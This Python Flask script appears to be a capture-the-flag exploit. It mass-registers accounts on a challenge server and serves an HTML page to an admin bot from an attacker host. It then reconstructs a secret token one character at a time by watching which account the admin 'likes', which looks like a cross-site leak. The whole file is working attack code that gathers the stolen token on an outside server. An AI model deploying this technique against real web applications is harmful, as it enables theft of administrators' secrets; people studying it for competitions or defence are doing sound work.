from flask import Flask
from threading import Thread
import random, string
import requests
import re
import time
app = Flask(__name__)


token = ""
users = []
challenge_url = "http://218.197.154.9:10000/"
challenge_url_for_bot = "http://jrxnm.com/"
payload_url = "http://blog.szfszf.top:9015/"
user_id = 1233
chars = "abcdef0123456789"


@app.route('/return')
def return_token():
    return token


@app.route('/noframe.html')
def client():
    ids = [str(u.id) for u in users]
    return open('noframe.html').read()%(str(ids), challenge_url_for_bot, payload_url, str(user_id))


def get_random(num=32):
    ran_str = ''.join(random.sample(string.ascii_letters + string.digits, num))
    return ran_str

class User:
    def __init__(self):
        self.s, self.id = self.create_user()

    def create_user(self):
        username = get_random()
        password = get_random()
        data = {"username": username, "password": password}
        s = requests.Session()
        res1 = s.post(challenge_url+'login', data=data)
        res2 = s.get(challenge_url+'post')
        pa = re.compile(r'/post/(\d+)/')
        user_id = int(pa.findall(res2.text)[0])
        print(user_id)
        return s,user_id

    def post(self):
        data = {"post": get_random()}
        self.s.post(challenge_url+'post', data=data)


    def check_admin_like(self):
        global token
        res = self.s.get(challenge_url+'post')
        if 'admin' in res.text:
            ids = [str(u.id) for u in users]
            c = chars[ids.index(str(self.id))]
            token += c
            print(token)
            self.post()
            return True
        return False

def get_token():
    get_users()
    while True:
        for u in users:
            t = Thread(target=u.check_admin_like)
            t.start()
        time.sleep(0.2)

def get_users():
    for i in range(16):
        users.append(User())

    ids = [str(u.id) for u in users]
    print(ids)


if __name__ == '__main__':
    t = Thread(target=get_token)
    t.start()
    app.run(host='0.0.0.0', port=9015)
